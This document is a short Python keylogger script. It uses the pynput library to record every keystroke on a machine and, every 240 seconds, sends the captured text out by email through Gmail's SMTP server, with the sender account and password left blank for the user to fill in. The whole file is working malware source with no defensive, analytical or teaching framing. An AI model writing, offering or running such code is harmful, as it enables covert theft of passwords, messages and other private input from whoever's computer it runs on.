import pynput.keyboard
import smtplib
import threading

gmail = ""
password = ""


log = ""

def function(key):
	global log
	try:
		log = log + str(key.char)
		print(log)
		
	except AttributeError:
		if key == key.space:
			log = log + " "
		else:
			log = log + str(key)
def mail(gmail , password , message):
	email = smtplib.SMTP("smtp.gmail.com" , 587)
	email.starttls()
	email.login(gmail , password)
	email.sendmail(gmail , gmail , message)
	email.quit()
	
def function2():
	global log
	mail(gmail , password , log)
	log = ""
	object1 = threading.Timer(240 , function2)
	object1.start()

keylogger = pynput.keyboard.Listener(on_press = function)

with keylogger:
	function2()
	keylogger.join()
